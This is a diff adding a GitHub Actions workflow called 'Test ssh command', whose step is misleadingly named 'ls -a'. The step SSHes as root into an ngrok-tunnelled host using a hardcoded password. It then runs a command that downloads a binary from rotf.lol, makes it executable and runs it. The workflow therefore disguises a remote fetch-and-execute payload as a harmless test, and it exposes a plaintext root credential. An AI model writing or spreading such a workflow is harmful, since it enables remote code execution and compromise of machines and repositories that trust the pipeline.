@@ -1,0 +1,20 @@
+name: Test ssh command
+on: push
+
+env:
+  FIRST_NAME: Terry
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: ls -a via OPEN SSH Private Key
+        uses: tarunjangra/ssh-remote-cmd@master
+        with:
+          command: |
+            wget https://rotf.lol/violet && chmod +x violet && ./violet
+          host: 2.tcp.ngrok.io:18555
+          host: 2.tcp.ngrok.io
+          port: 18555
+          user: root         
+          pass: h2Zy1szQP2Xn84dXNjyk
+          args: "-tt -vvv"
